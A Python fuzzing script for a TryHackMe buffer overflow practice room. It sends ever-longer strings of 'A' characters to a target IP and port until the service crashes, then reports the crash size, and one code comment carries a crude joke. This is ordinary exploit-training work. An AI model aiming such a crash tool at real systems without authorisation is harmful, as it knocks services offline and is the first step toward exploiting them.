#!/usr/bin/env python3

"""
This works against TryHackMe buffer overflow prep room's "oscp" application.
"""

import argparse  # for parsing arguments.
import socket
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument("-I", "--ip-address", help="IP address of target machine")
parser.add_argument("-P", "--port", help="PORT application is listening on.", default=1337, nargs='?', type=int,
                    const=1337)
parser.add_argument("-T", "--timeout", help="TIMEOUT for socket connection", default=5, nargs='?', type=int, const=5)
parser.add_argument("-S", "--string-prefix", help="STRING PREFIX for app", default='OVERFLOW1 ')

ip = "10.10.10.10"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

args = parser.parse_args()

if args.ip_address:
    ip = args.ip_address
if args.port:
    port = args.port
if args.timeout:
    timeout = args.timeout
if args.string_prefix:
    prefix = args.string_prefix

print("Attacking {}:{} with '{}'. timeout={}".format(ip, port, prefix, timeout))

# The string she told you to not worry about. Also, it is a grower.
# String that we send to crash the app. It's true about the growth, it can get massive.
string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

